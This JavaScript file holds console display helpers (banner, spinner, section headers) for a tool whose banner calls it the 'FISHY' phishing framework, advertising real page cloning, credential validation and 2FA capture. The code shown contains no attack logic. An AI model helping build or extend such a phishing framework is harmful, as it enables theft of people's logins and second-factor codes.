import chalk from 'chalk';

export function printBanner() {
  console.log();
  console.log(chalk.gray('╔' + '═'.repeat(48) + '╗'));
  console.log(chalk.gray('║') + '  ' + chalk.red('🐟 FISHY') + ' ' + chalk.gray('—') + ' ' + chalk.white('Phishing Framework') + '      ' + chalk.gray('║'));
  console.log(chalk.gray('║') + '  ' + chalk.gray('Real page cloning · Credential validation · 2FA capture') + '  ' + chalk.gray('║'));
  console.log(chalk.gray('╚' + '═'.repeat(48) + '╝'));
  console.log();
}

export function printSpin(text) {
  const frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
  let i = 0;
  const interval = setInterval(() => {
    process.stdout.write(`\r  ${chalk.cyan(frames[i])} ${text}`);
    i = (i + 1) % frames.length;
  }, 80);
  return {
    stop: (msg) => {
      clearInterval(interval);
      process.stdout.write(`\r  ${chalk.green('✓')} ${msg || text}\n`);
    },
    fail: (msg) => {
      clearInterval(interval);
      process.stdout.write(`\r  ${chalk.red('✗')} ${msg || text}\n`);
    },
  };
}

export function printSection(title) {
  console.log();
  console.log(chalk.gray('─── ') + chalk.white(title) + chalk.gray(' ───'));
}
